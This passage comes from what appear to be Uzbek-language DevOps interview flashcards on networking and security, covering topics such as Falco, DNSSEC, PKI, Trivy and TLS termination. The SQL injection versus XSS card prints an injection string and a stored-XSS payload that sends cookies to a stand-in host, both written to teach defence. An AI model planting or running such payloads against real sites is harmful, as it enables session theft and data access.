Rekor'da bormi? -&gt; ruxsat</pre><p><b>Amalda:</b></p><pre>permissions: { id-token: write, packages: write }<br>steps:<br>  - uses: sigstore/cosign-installer@v3<br>  - run: cosign sign --yes ghcr.io/org/app@${{ steps.build.outputs.digest }}</pre><pre>cosign verify ghcr.io/org/app@sha256:abc... \<br>  --certificate-identity-regexp 'https://github.com/org/app/.github/workflows/release.yml@.*' \<br>  --certificate-oidc-issuer https://token.actions.githubusercontent.com</pre><p><b>Tuzoqlar:</b></p><ul><li>Tag'ni imzolash/deploy qilish — tag o'zgaruvchan; doim digest.</li><li>Tekshiruvda faqat &quot;imzo bor&quot; ni tekshirish, identity'ni emas — har kim o'z workflow'ida imzolashi mumkin.</li><li>Private infratuzilmada public Rekor'ga identity ma'lumoti chiqishi — kerak bo'lsa private Sigstore.</li></ul><p><b>Senior nuqta:</b> Imzo — supply chain zanjirining bir halqasi: SLSA provenance attestation + SBOM + admission'da majburiy tekshiruv (Kyverno/Gatekeeper/Ratify) bilan birga ma'noga ega.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41879	<p>Falco Kubernetes'da runtime tahdidlarni qanday aniqlaydi?</p>	<p><b>Qisqa javob:</b> Falco kernel'dagi syscall'larni (eBPF probe orqali) va K8s audit hodisalarini real vaqtda kuzatadi, ularni Kubernetes metadata'si bilan boyitadi va qoidalarga solishtiradi. Shubhali xulq (container'da shell ochilishi, <code>/etc/shadow</code> o'qilishi, kutilmagan chiquvchi ulanish) topilsa darhol alert beradi.</p><p><b>Nega kerak:</b> Image skaneri ma'lum CVE'ni topadi, lekin zero-day yoki buzilgan credential bilan ichkariga kirgan hujumchini ko'rmaydi. Runtime detection — &quot;hozir nima bo'lyapti?&quot; savoliga javob.</p><pre>Container process -&gt; syscall (execve, open, connect)<br>                        |<br>                   eBPF probe (kernel)<br>                        |<br>                   Falco engine + K8s metadata (pod, ns, image)<br>                        | qoida: spawned_process and container and shell_procs<br>                        v<br>                   Alert -&gt; stdout / Falcosidekick -&gt; Slack, SIEM, PagerDuty<br>                                       |<br>                                  (ixtiyoriy) Talon -&gt; pod'ni izolyatsiya</pre><p><b>Amalda (custom qoida):</b></p><pre>- rule: Shell in prod container<br>  desc: Prod namespace'da interaktiv shell<br>  condition: &gt;<br>    spawned_process and container and k8s.ns.name = &quot;prod&quot;<br>    and proc.name in (bash, sh, zsh) and proc.tty != 0<br>  output: &quot;Shell ochildi (user=%user.name pod=%k8s.pod.name cmd=%proc.cmdline image=%container.image.repository)&quot;<br>  priority: WARNING<br>  tags: [container, mitre_execution]</pre><pre>helm install falco falcosecurity/falco -n falco --create-namespace \<br>  --set driver.kind=modern_ebpf --set falcosidekick.enabled=true<br>kubectl logs -n falco ds/falco | grep -i warning</pre><p><b>Tuzoqlar:</b></p><ul><li>Default qoidalar shovqinli (CI, debug pod'lar) — tuning va istisnolarsiz alert fatigue.</li><li>Alert'lar faqat log'da qoladi, hech kim ko'rmaydi — SIEM/on-call'ga ulash.</li><li>Eski kernel'da modern eBPF ishlamaydi — driver turini tekshir.</li></ul><p><b>Senior nuqta:</b> Falco — detection, prevention emas. Uni default-deny egress, read-only rootfs va PSA bilan birlashtir; avtomatik javob (pod'ni o'chirish) ehtiyotkorlik bilan — false positive prod'ni yiqitishi mumkin.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41880	<p>BGP routing va Anycast farqi.</p>	<p><b>Qisqa javob:</b> BGP — autonom tizimlar (AS: provider, cloud, katta kompaniya) orasida &quot;qaysi IP prefikslariga men orqali yetish mumkin&quot; ma'lumotini almashadigan internet routing protokoli. Anycast — bir xil IP prefiksini dunyoning ko'p joyidan BGP orqali e'lon qilish; har client tarmoq bo'yicha eng yaqin nuqtaga boradi.</p><p><b>Aloqasi:</b> Anycast BGP'ning ustida qurilgan texnika: BGP mexanizm, Anycast — undan foydalanish usuli.</p><pre>Unicast: 1.2.3.4 faqat Frankfurt'da -&gt; Toshkent client'i Frankfurt'gacha boradi<br><br>Anycast: 1.1.1.1 ni 300 PoP e'lon qiladi (har biri BGP announce)<br>   Toshkent client -&gt; BGP eng qisqa AS-path -&gt; Istanbul PoP<br>   Nyu-York client -&gt; Ashburn PoP<br>   Bitta PoP tushsa -&gt; e'lon olib tashlanadi -&gt; trafik keyingi eng yaqin PoP'ga</pre><p><b>Foydasi:</b> past latency (DNS, CDN), avtomatik failover, DDoS trafikini ko'p PoP'ga taqsimlash.</p><p><b>Amalda:</b></p><pre>traceroute 1.1.1.1                       # qaysi PoP'ga borayotganingni ko'r<br>dig +short CHAOS TXT id.server @1.1.1.1  # javob bergan PoP kodi<br>whois -h whois.radb.net AS13335          # AS haqida</pre><p>Misollar: Cloudflare/Google DNS (1.1.1.1, 8.8.8.8), root DNS server'lar, AWS Global Accelerator, CDN'lar.</p><p><b>Tuzoqlar:</b></p><ul><li>Anycast stateful TCP uchun: BGP yo'li o'zgarsa uzoq ulanish boshqa PoP'ga tushib uzilishi mumkin — shuning uchun qisqa so'rovli protokollarga (DNS, HTTP) mos.</li><li>BGP hijack/leak — kimdir sening prefiksingni noto'g'ri e'lon qiladi; RPKI (ROA) bilan himoya.</li><li>&quot;Eng yaqin&quot; = BGP bo'yicha, geografik emas.</li></ul><p><b>Senior nuqta:</b> Ko'p jamoalar BGP'ni bevosita sozlamaydi, lekin uning oqibatlarini his qiladi: Facebook 2021 avariyasi (BGP e'lonlari olib tashlandi) va Kubernetes'da MetalLB/Calico BGP rejimi. Global ko'p regionli arxitekturada Anycast LB (Global Accelerator) DNS-asosidagi failover'dan tezroq.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41881	<p>HTTP/3 (QUIC) nima va nega HTTP/2 dan yaxshiroq?</p>	<p><b>Qisqa javob:</b> HTTP/3 — HTTP'ning TCP o'rniga QUIC (UDP ustidagi transport) ustida ishlaydigan versiyasi. HTTP/2 dan asosiy ustunligi: transport darajasidagi head-of-line blocking yo'q, tezroq handshake (TLS 1.3 o'rnatilgan, 1-RTT/0-RTT) va connection migration (Wi-Fi'dan 4G'ga o'tganda ulanish saqlanadi).</p><p><b>Muammo HTTP/2'da:</b> HTTP/2 bitta TCP ulanishda ko'p stream'ni multiplekslaydi. Lekin TCP baytlarni qat'iy tartibda beradi: bitta paket yo'qolsa, retransmission kelguncha <b>barcha</b> stream'lar kutadi. Yo'qotishli mobil tarmoqda bu HTTP/1.1 dan ham yomonroq bo'lishi mumkin.</p><pre>HTTP/2 over TCP:<br>stream A: [1][2][X][4]   &lt;- paket 3 yo'qoldi<br>stream B: [1][2][3]      &lt;- B ning ma'lumoti keldi, lekin TCP uni bermaydi, kutadi<br><br>HTTP/3 over QUIC:<br>stream A: [1][2][X][4]   &lt;- faqat A kutadi<br>stream B: [1][2][3] -&gt; darhol ilovaga<br><br>Handshake: TCP(1 RTT) + TLS1.3(1 RTT) = 2 RTT   vs   QUIC = 1 RTT (yoki 0-RTT)</pre><p><b>Amalda:</b></p><pre>curl -sI --http3 https://cloudflare.com | head -1     # curl HTTP/3 qo'llovi bilan qurilgan bo'lsa<br>curl -sI https://example.com | grep -i alt-svc        # alt-svc: h3=&quot;:443&quot; -&gt; server h3 ni taklif qiladi</pre><p>Nginx (1.25+):</p><pre>listen 443 quic reuseport;<br>listen 443 ssl;<br>http3 on;<br>add_header Alt-Svc 'h3=&quot;:443&quot;; ma=86400';</pre><p>Firewall/Security Group'da <b>UDP 443</b> ochilishi kerak.</p><p><b>Tuzoqlar:</b></p><ul><li>UDP 443 bloklangan — brauzer jimgina HTTP/2 ga tushadi; &quot;h3 yoqdik, foyda yo'q&quot; holati.</li><li>L4 load balancer UDP'ni connection ID bo'yicha emas, IP/port bo'yicha taqsimlasa, migration'dan keyin paket boshqa backend'ga tushadi.</li><li>QUIC user-space'da — server CPU sarfi TCP+TLS dan yuqori bo'lishi mumkin.</li></ul><p><b>Senior nuqta:</b> HTTP/3 asosan edge'da (CDN -&gt; client) foyda beradi — yuqori latency va yo'qotishli tarmoqlarda. Data center ichidagi servis-servis trafikida HTTP/2 (gRPC) yetarli va operatsion jihatdan soddaroq.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41882	<p>KMS envelope encryption (xavfsizlik kontekstida) qanday?</p>	<p><b>Qisqa javob:</b> Envelope encryption — ma'lumotni lokal Data Encryption Key (DEK) bilan shifrlash, DEK'ning o'zini esa KMS'dagi master kalit (KEK) bilan shifrlash. Shifrlangan DEK ma'lumot yonida saqlanadi; master kalit hech qachon KMS'dan chiqmaydi.</p><p><b>Nega:</b> KMS'ga 5 GB fayl yuborib bo'lmaydi (AWS KMS <code>Encrypt</code> limiti 4 KB, har chaqiruv tarmoq va pul). Envelope bilan KMS'ga faqat kichik kalit uchun murojaat qilinadi, bulk shifrlash lokal va tez.</p><pre>Shifrlash:<br>App -&gt; KMS GenerateDataKey(KeyId) -&gt; { plaintext DEK, encrypted DEK }<br>App: AES-256-GCM(data, plaintext DEK) -&gt; ciphertext<br>App: plaintext DEK ni xotiradan o'chiradi<br>Saqla: [encrypted DEK | ciphertext]<br><br>Ochish:<br>App -&gt; KMS Decrypt(encrypted DEK)  &lt;- IAM tekshiruv + CloudTrail log<br>    -&gt; plaintext DEK -&gt; ciphertext'ni lokal ochadi</pre><p><b>Amalda:</b></p><pre>aws kms generate-data-key --key-id alias/app --key-spec AES_256 \<br>  --query '{p:Plaintext,c:CiphertextBlob}'<br>aws kms decrypt --ciphertext-blob fileb://dek.enc --query Plaintext --output text</pre><p>Amalda o'zing yozmaysan: AWS Encryption SDK, Google Tink, S3 SSE-KMS, EBS/RDS shifrlash ichida aynan shu sxema.</p><p><b>Afzalliklari:</b> master kalit rotatsiyasi ma'lumotni qayta shifrlashni talab qilmaydi (faqat DEK'larni rewrap); kirish nazorati va audit KMS'da markazlashgan; kalitni o'chirish (crypto-shredding) bilan ma'lumotni &quot;o'chirish&quot;.</p><p><b>Tuzoqlar:</b></p><ul><li>Plaintext DEK'ni diskka/log'ga yozish.</li><li>Har bir yozuv uchun KMS chaqiruvi — throttling (<code>ThrottlingException</code>) va xarajat; DEK cache'lash (ehtiyotkorlik bilan).</li><li>KMS kalitni o'chirish rejalashtirilsa — u bilan shifrlangan hamma narsa abadiy yo'qoladi (7-30 kun kutish davri).</li></ul><p><b>Senior nuqta:</b> Encryption context (masalan <code>tenant_id</code>) qo'shish — AAD sifatida ishlaydi va CloudTrail'da kim qaysi tenant ma'lumotini ochganini ko'rsatadi. Multi-tenant SaaS'da tenant bo'yicha alohida kalit — crypto-shredding va izolyatsiya uchun.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41883	<p>CIS Benchmark nima va Kubernetes'da qanday majburlanadi?</p>	<p><b>Qisqa javob:</b> CIS Benchmark — Center for Internet Security tomonidan konsensus asosida yozilgan hardening qo'llanmasi (OS, Docker, Kubernetes, cloud uchun). Kubernetes uchun u API server flag'lari, etcd, kubelet, fayl ruxsatlari, RBAC, pod siyosatlarini qamraydi. Tekshiruv <code>kube-bench</code> bilan avtomatlashtiriladi, majburlash esa IaC, admission policy va managed default'lar orqali.</p><p><b>Nega kerak:</b> &quot;Klaster xavfsizmi?&quot; savoliga sub'yektiv emas, o'lchanadigan javob — har tekshiruv PASS/FAIL. Audit va compliance (SOC 2, PCI) ham shunga tayanadi.</p><pre>Qatlamlar:<br>1 Control plane  : --anonymous-auth=false, audit log, --authorization-mode=Node,RBAC<br>2 etcd           : TLS, client cert auth, encryption at rest<br>3 Control plane config fayllari: ruxsat 600, egasi root<br>4 Worker node    : kubelet --anonymous-auth=false, --read-only-port=0, rotate certs<br>5 Policies       : RBAC minimal, PSA, NetworkPolicy, secret boshqaruvi</pre><p><b>Amalda:</b></p><pre>kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml<br>kubectl logs job/kube-bench<br># [FAIL] 4.2.6 Ensure that the --protect-kernel-defaults argument is set to true<br># == Remediations == ... qanday tuzatish<br>trivy k8s --compliance k8s-cis-1.23 --report summary   # muqobil</pre><p>EKS/GKE/AKS uchun alohida profil bor (<code>kube-bench --benchmark eks-1.5.0</code>) — control plane provider'niki, faqat node va policy qismlari sening javobgarliging.</p><p><b>Tuzoqlar:</b></p><ul><li>Managed klasterda generic CIS profilini ishlatish — control plane tekshiruvlari &quot;FAIL&quot; chiqadi, lekin ularni o'zgartirib bo'lmaydi.</li><li>Bir martalik skan — drift kuzatilmaydi; davriy job va natijalarni monitoringga yuborish kerak.</li><li>100% PASS'ni maqsad qilish — ba'zi tavsiyalar sening muhitingga mos emas; istisnolarni sababi bilan hujjatlashtir.</li></ul><p><b>Senior nuqta:</b> Majburlash kodda bo'lsin: node image (Bottlerocket, CIS hardened AMI), Terraform modullari, Kyverno/PSA policy'lari. kube-bench — tekshiruvchi, haqiqiy nazorat esa &quot;noto'g'ri holatni yaratib bo'lmaydigan&quot; platforma.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41884	<p>Zero-day zaiflik nima va defense in depth uni qanday kamaytiradi?</p>	<p><b>Qisqa javob:</b> Zero-day — vendor hali bilmaydigan yoki patch chiqarmagan, lekin allaqachon exploit qilinayotgan zaiflik. Uni oldindan to'sib bo'lmaydi, shuning uchun defense in depth maqsadi — exploit muvaffaqiyatli bo'lsa ham hujumchining keyingi qadamlarini (shell, lateral movement, data chiqarish) to'sish va tez aniqlash.</p><p><b>Mental model:</b> Hujum zanjir (kill chain). Zero-day faqat birinchi halqa. Har keyingi halqani bir qatlam uzadi.</p><pre>Exploit (zero-day, masalan RCE)        &lt;- to'sib bo'lmaydi<br>  v<br>Shell ochish                           &lt;- distroless image (shell yo'q), readOnlyRootFilesystem<br>  v<br>Privilege escalation                   &lt;- non-root, drop ALL caps, seccomp, allowPrivilegeEscalation=false<br>  v<br>Lateral movement                       &lt;- default-deny NetworkPolicy, mTLS + authz<br>  v<br>Credential o'g'irlash                  &lt;- qisqa muddatli token, IMDSv2, minimal IAM<br>  v<br>C2 / data exfiltration                 &lt;- egress allowlist, egress proxy<br>  |<br>Har bosqichda: Falco/GuardDuty aniqlash -&gt; alert -&gt; incident response</pre><p><b>Amalda:</b></p><pre>spec:<br>  automountServiceAccountToken: false<br>  containers:<br>  - name: app<br>    image: gcr.io/distroless/static:nonroot<br>    securityContext:<br>      runAsNonRoot: true<br>      readOnlyRootFilesystem: true<br>      allowPrivilegeEscalation: false<br>      capabilities: { drop: [&quot;ALL&quot;] }</pre><p>Log4Shell misoli: egress bloklangan pod'lar LDAP orqali zararli class yuklay olmadi — patch'gacha himoyalangan edi.</p><p><b>Tuzoqlar:</b></p><ul><li>&quot;Biz tez patch qilamiz&quot; — zero-day'da patch yo'q; virtual patch (WAF qoidasi) va izolyatsiya kerak.</li><li>Egress ochiq qoldirish — eng ko'p e'tibordan chetda qoladigan qatlam.</li><li>Detection bor, lekin incident runbook va mashq yo'q.</li></ul><p><b>Senior nuqta:</b> Investitsiyani &quot;blast radius&quot; ni kamaytirishga yo'naltir: bitta servis buzilsa nimaga yeta oladi? Asset inventory (SBOM) zero-day e'lon qilinganda soatlar ichida ta'sirni aniqlash imkonini beradi.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41885	<p>DNSSEC nima?</p>	<p><b>Qisqa javob:</b> DNSSEC DNS javoblariga raqamli imzo qo'shadi: resolver javob haqiqatan zona egasidan kelgani va yo'lda o'zgartirilmaganini tekshiradi. U cache poisoning va spoofing'dan himoya qiladi, lekin shifrlamaydi — maxfiylik uchun DoT/DoH kerak.</p><p><b>Muammo:</b> Klassik DNS (UDP) javobini soxtalashtirish mumkin (Kaminsky hujumi, 2008): resolver cache'iga <code>bank.com -&gt; hujumchi IP</code> yoziladi va minglab foydalanuvchi soxta saytga boradi.</p><pre>Ishonch zanjiri:<br>. (root)  -- DS(com) imzolangan root KSK bilan (trust anchor resolver'da)<br>  v<br>.com      -- DS(example.com) imzolangan .com kaliti bilan<br>  v<br>example.com DNSKEY -&gt; RRSIG(A www.example.com)<br>Resolver: har bo'g'in imzosini tekshiradi -&gt; mos -&gt; AD flag; mos emas -&gt; SERVFAIL</pre><p>| Yozuv | Vazifa | |---|---| | DNSKEY | zona public kalitlari (KSK, ZSK) | | RRSIG | yozuvlar to'plamining imzosi | | DS | ota zonadagi bola kalitining hash'i (zanjir bog'i) | | NSEC/NSEC3 | &quot;bunday nom yo'q&quot; ni isbotlash |</p><p><b>Amalda:</b></p><pre>dig +dnssec example.com A        # RRSIG yozuvlarini ko'r<br>dig example.com +dnssec | grep flags    # &quot;ad&quot; flag -&gt; resolver tasdiqladi<br>delv example.com                 # to'liq validatsiya: &quot;; fully validated&quot;<br>aws route53 enable-hosted-zone-dnssec --hosted-zone-id Z123</pre><p><b>Tuzoqlar:</b></p><ul><li>Kalit rotatsiyasi yoki DS yozuvini registrar'da yangilashni unutish — butun domen validatsiya qiluvchi resolver'lar uchun SERVFAIL (eng ko'p avariya sababi).</li><li>DNSSEC maxfiylik beradi deb o'ylash — so'rovlar ochiq qoladi.</li><li>Katta javoblar — UDP fragmentatsiya, TCP 53 ochiq bo'lishi kerak.</li></ul><p><b>Senior nuqta:</b> DNSSEC'ni yoqish oson, xato qilish qimmat: provider avtomatik kalit boshqaruvini (Route 53 + KMS, Cloudflare) ishlat va monitoring qo'y (DNSViz). Ko'p korporativ zonalarda haqiqiy xavf — registrar akkaunti buzilishi; registrar lock va MFA ham bir xil darajada muhim.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41886	<p>SQL injection va XSS farqi.</p>	<p><b>Qisqa javob:</b> SQL injection — foydalanuvchi input'i SQL so'rov matniga qo'shilib, so'rov mantiqini o'zgartirishi (server tomonda, DB'ga hujum). XSS — input boshqa foydalanuvchining brauzerida JavaScript sifatida bajarilishi (client tomonda, foydalanuvchiga hujum). Ikkalasining ildizi bir: ma'lumot va kod aralashadi.</p><pre>SQLi:<br>input: ' OR '1'='1<br>&quot;SELECT * FROM users WHERE name = '&quot; + input + &quot;'&quot;<br>-&gt; SELECT * FROM users WHERE name = '' OR '1'='1'   -&gt; hamma user<br><br>XSS (stored):<br>comment: &lt;script&gt;fetch('//evil.io?c='+document.cookie)&lt;/script&gt;<br>-&gt; DB'ga saqlanadi -&gt; boshqa user sahifani ochadi -&gt; uning cookie'si o'g'irlanadi</pre><p>| | SQLi | XSS | |---|---|---| | Nishon | DB / server | boshqa foydalanuvchi brauzeri | | Oqibat | data o'g'irlash/o'chirish, auth bypass | session o'g'irlash, foydalanuvchi nomidan harakat | | Asosiy himoya | parametrlangan so'rov | kontekstga mos output encoding | | Qo'shimcha | least privilege DB user, ORM | CSP, <code>HttpOnly</code>/<code>SameSite</code> cookie, sanitizer |</p><p><b>Amalda:</b></p><pre>// Xato<br>db.Query(&quot;SELECT * FROM users WHERE email = '&quot; + email + &quot;'&quot;)<br>// To'g'ri<br>db.Query(&quot;SELECT * FROM users WHERE email = $1&quot;, email)</pre><pre>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'<br>Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax</pre><p>Go'da <code>html/template</code>, React'da JSX avtomatik escape qiladi; <code>dangerouslySetInnerHTML</code> / <code>v-html</code> — xavf nuqtasi.</p><p><b>Tuzoqlar:</b></p><ul><li>Input'ni &quot;tozalash&quot; (qora ro'yxat) — bypass'lar cheksiz; parametrlash va encoding ishlat.</li><li>ORM ichida raw query yoki <code>ORDER BY</code> uchun string birlashtirish — ustun nomlarini allowlist bilan tekshir.</li><li>XSS'ni faqat <code>&lt;script&gt;</code> deb o'ylash — <code>onerror=</code>, <code>javascript:</code> URL, attribute kontekst.</li></ul><p><b>Senior nuqta:</b> Ikkala sinf ham OWASP Top 10'da &quot;Injection&quot; ostida. DevOps tomonida: SAST qoidalari, WAF virtual patch, CSP report-only bilan monitoring, DB user'ga minimal huquq (DDL yo'q) — exploit bo'lsa ham zarar chegaralangan.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41887	<p>PKI va Certificate Authority (CA) nima?</p>	<p><b>Qisqa javob:</b> PKI (Public Key Infrastructure) — public kalitlarni identity'larga ishonchli bog'lash uchun tizim: CA'lar, sertifikatlar, siyosatlar, revocation. CA (Certificate Authority) — identity'ni tekshirib, uning public kalitini o'z imzosi bilan tasdiqlaydigan (X.509 sertifikat chiqaradigan) ishonchli tomon.</p><p><b>Muammo:</b> Brauzer <code>bank.com</code> dan public kalit oldi. Bu haqiqatan bank kalitimi yoki MITM hujumchinikimi? Javob: kalit brauzer allaqachon ishonadigan CA tomonidan imzolangan.</p><pre>Root CA (oflayn, OS/brauzer trust store'da)<br>   | imzolaydi<br>Intermediate CA (onlayn, kundalik chiqarish)<br>   | imzolaydi<br>Leaf: CN/SAN=api.example.com, public key, muddati, imzo<br>Server yuboradi: leaf + intermediate (zanjir)<br>Client: leaf -&gt; intermediate -&gt; root (trust store) -&gt; SAN mos? muddat? revoked?</pre><p><b>Amalda:</b></p><pre>openssl s_client -connect api.example.com:443 -showcerts &lt;/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName<br>openssl verify -CAfile root.pem -untrusted intermediate.pem leaf.pem<br># Ichki CA uchun cert-manager:<br>kubectl get certificate -A        # READY, muddati</pre><p>Turlar: public CA (Let's Encrypt — ACME, 90 kun; DigiCert), private CA (Vault PKI, AWS Private CA, cert-manager) ichki mTLS uchun.</p><p><b>Tuzoqlar:</b></p><ul><li>Server intermediate'ni yubormaydi — brauzer ishlaydi (cache), lekin <code>curl</code>/Java client'lar &quot;unable to get local issuer certificate&quot;.</li><li>Sertifikat muddati tugashi — eng klassik avariya; avtomatik yangilash va 30/14/7 kunlik alert.</li><li>Ichki root CA kalitini onlayn serverda saqlash.</li></ul><p><b>Senior nuqta:</b> Sertifikat muddatlari qisqarmoqda (CA/B Forum: 2029-yilga borib 47 kun) — avtomatlashtirish (ACME, cert-manager) endi majburiy. Revocation (CRL/OCSP) amalda ishonchsiz; qisqa umrli sertifikatlar — zamonaviy yondashuv.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41888	<p>GuardDuty va Security Hub farqi.</p>	<p><b>Qisqa javob:</b> GuardDuty — tahdid aniqlash xizmati: CloudTrail, VPC Flow Logs, DNS log, EKS audit va runtime ma'lumotlarini ML va threat intel bilan tahlil qilib, faol hujum belgilarini (crypto mining, o'g'irlangan credential, C2 ga ulanish) topadi. Security Hub — markaziy panel: GuardDuty, Inspector, Macie, Config va boshqa tool'lar topilmalarini jamlaydi va compliance standartlari (CIS, PCI-DSS, AWS FSBP) bo'yicha holatni baholaydi.</p><p><b>Farq bir jumlada:</b> GuardDuty &quot;hozir kimdir hujum qilyaptimi?&quot; (detection), Security Hub &quot;umumiy xavfsizlik holatimiz qanday va qaysi topilmalar ochiq?&quot; (posture + agregatsiya).</p><pre>CloudTrail, Flow Logs, DNS, EKS audit -&gt; GuardDuty  --findings-+<br>ECR/EC2/Lambda zaifliklari          -&gt; Inspector   ----------+<br>S3'dagi PII                          -&gt; Macie       ----------+--&gt; Security Hub (ASFF format)<br>Resurs konfiguratsiyasi              -&gt; AWS Config  ----------+       | standartlar skori<br>                                                                      v<br>                                                    EventBridge -&gt; Slack / Jira / SOAR</pre><p><b>Amalda:</b></p><pre>aws guardduty create-detector --enable<br>aws guardduty list-findings --detector-id &lt;id&gt; \<br>  --finding-criteria '{&quot;Criterion&quot;:{&quot;severity&quot;:{&quot;Gte&quot;:7}}}'<br>aws securityhub enable-security-hub --enable-default-standards<br>aws securityhub get-findings --filters '{&quot;SeverityLabel&quot;:[{&quot;Value&quot;:&quot;CRITICAL&quot;,&quot;Comparison&quot;:&quot;EQUALS&quot;}]}'</pre><p>Misol GuardDuty topilmalari: <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</code>, <code>CryptoCurrency:EC2/BitcoinTool.B</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Faqat bitta region/akkauntda yoqish — hujumchi ishlatilmaydigan regionda resurs ochadi. Organizations orqali hamma akkaunt va regionda.</li><li>Topilmalar konsolda qoladi — EventBridge orqali on-call'ga yo'naltirilmagan.</li><li>Security Hub skorini maqsad qilib, haqiqiy riskni prioritetlamaslik.</li></ul><p><b>Senior nuqta:</b> Delegated admin akkaunt (security tooling akkaunti) va markazlashgan log arxivi — multi-account AWS'da standart. Ko'p cloud'da Security Hub o'rniga CNAPP (Wiz, Prisma) yoki SIEM agregatsiya rolini oladi.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41889	<p>Trivy qaysi artifact turlarini skanerlaydi?</p>	<p><b>Qisqa javob:</b> Trivy (Aqua Security, open source) bitta binary bilan ko'p nishonni skanerlaydi: container image, fayl tizimi/repo (lock fayllar), Git remote repo, IaC (Terraform, CloudFormation, Helm, Kubernetes YAML, Dockerfile), jonli Kubernetes klaster, VM image va SBOM. Topadigan narsalari: CVE (OS paketlari va til dependency'lari), misconfiguration, secret va litsenziya.</p><p>| Nishon | Buyruq | Nima topadi | |---|---|---| | Image | <code>trivy image nginx:1.27</code> | OS + til CVE, secret | | Fayl tizimi / repo | <code>trivy fs .</code> | dependency CVE, secret | | Remote repo | <code>trivy repo https://github.com/org/app</code> | shu | | IaC | <code>trivy config ./terraform</code> | misconfiguration | | K8s klaster | <code>trivy k8s --report summary</code> | workload CVE + config + RBAC | | SBOM | <code>trivy sbom sbom.cdx.json</code> | SBOM bo'yicha CVE | | Yaratish | <code>trivy image --format cyclonedx -o sbom.json app</code> | SBOM |</p><p><b>Amalda (CI gate):</b></p><pre>trivy image --severity CRITICAL,HIGH --ignore-unfixed --exit-code 1 myapp:${SHA}<br>trivy config --severity HIGH,CRITICAL --exit-code 1 ./infra</pre><pre>myapp:abc (debian 12)<br>Total: 3 (HIGH: 2, CRITICAL: 1)<br>| Library | Vulnerability  | Severity | Installed | Fixed Version |<br>| openssl | CVE-2024-XXXX  | CRITICAL | 3.0.11    | 3.0.13        |</pre><p>&quot;Fixed Version&quot; bo'sh bo'lsa — patch hali yo'q.</p><p><b>Tuzoqlar:</b></p><ul><li>Har CI job'da DB'ni qayta yuklab olish — sekin va rate limit; DB'ni cache'la yoki mirror (<code>--db-repository</code>) ishlat.</li><li><code>.trivyignore</code> ga sababsiz/muddatsiz yozish.</li><li>Faqat build vaqtida skanerlash — yangi CVE eski image'larda chiqadi; registry/klasterda davriy skan (Trivy Operator).</li></ul><p><b>Senior nuqta:</b> 2025-yil martida Trivy'ning GitHub Action'i supply-chain hujumiga uchragan (tag'lar o'zgartirildi) — tool'ni versiya tag'i bilan emas, commit SHA bilan pin qil. Bir tool hamma narsani qilsa ham, natijalarni markaziy joyda dedup qilish va egasini belgilash zarur.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41890	<p>SSL termination va end-to-end encryption farqi.</p>	<p><b>Qisqa javob:</b> SSL/TLS termination — load balancer yoki proxy HTTPS'ni ochadi va backend'ga oddiy HTTP yuboradi (LB va backend orasida shifrlash yo'q). End-to-end encryption — trafik ilova process'igacha shifrlangan: yoki LB qayta shifrlaydi (re-encryption / TLS bridging), yoki umuman ochmaydi (TLS passthrough).</p><pre>1. Termination:<br>Client ==TLS==&gt; [LB: sertifikat] --HTTP--&gt; app     (ichki tarmoqda ochiq)<br><br>2. Re-encryption (bridging):<br>Client ==TLS==&gt; [LB: ochadi, L7 qoidalar] ==TLS==&gt; app (o'z sertifikati)<br><br>3. Passthrough:<br>Client ==TLS================================&gt; app (LB faqat L4, SNI bo'yicha)</pre><p>| | Termination | Re-encryption | Passthrough | |---|---|---|---| | LB L7 imkoniyatlari (path, WAF, header) | bor | bor | yo'q | | Ichki trafik shifrlangan | yo'q | ha | ha | | Sertifikat boshqaruvi | faqat LB | LB + backend | faqat backend | | CPU | eng kam | ikki marta TLS | backend'da |</p><p><b>Amalda:</b></p><pre># Re-encryption<br>location / {<br>  proxy_pass https://backend:8443;<br>  proxy_ssl_verify on;<br>  proxy_ssl_trusted_certificate /etc/nginx/internal-ca.pem;<br>  proxy_ssl_server_name on;<br>}</pre><p>Kubernetes: ingress-nginx'da <code>nginx.ingress.kubernetes.io/backend-protocol: &quot;HTTPS&quot;</code> yoki <code>ssl-passthrough</code>; service mesh esa sidecar'lar orasida mTLS bilan e2e'ni avtomatik beradi.</p><p><b>Tuzoqlar:</b></p><ul><li>Re-encryption'da <code>proxy_ssl_verify off</code> — shifrlash bor, lekin MITM'dan himoya yo'q.</li><li>Termination'dan keyin ilova <code>http</code> ni ko'radi va noto'g'ri redirect yasaydi — <code>X-Forwarded-Proto</code> ni hisobga ol.</li><li>Passthrough'da client IP va path bo'yicha marshrutlash, WAF imkonsiz.</li></ul><p><b>Senior nuqta:</b> &quot;Ichki tarmoq ishonchli&quot; taxmini Zero Trust'da qabul qilinmaydi; PCI-DSS/HIPAA ko'pincha ichki shifrlashni talab qiladi. Eng arzon yo'l — edge'da termination + ichkarida mesh mTLS: ilovada sertifikat boshqaruvi 